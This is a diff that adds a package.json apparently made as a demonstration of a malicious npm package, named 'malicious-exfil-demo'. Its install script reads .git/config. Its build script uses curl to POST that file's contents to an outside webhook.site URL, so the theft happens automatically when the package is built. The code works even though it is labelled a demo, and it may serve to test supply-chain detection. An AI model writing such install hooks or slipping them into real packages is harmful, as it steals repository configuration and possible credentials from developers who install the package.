@@ -1,0 +1,11 @@
+{
+    "name": "malicious-exfil-demo",
+    "version": "1.0.0",
+    "scripts": {
+      "install": "echo 'Malicious install script running...' && cat .git/config",
+      
+      "build": "echo 'Exfiltrating data to webhook.site...' && curl -X POST -H 'Content-Type: application/json' -d '{\"config\": \"'$(cat .git/config)'\"}' https://webhook.site/041bf490-6af7-4124-bcba-d5ef964ecdd6"
+    },
+    "dependencies": {}
+  }
+  
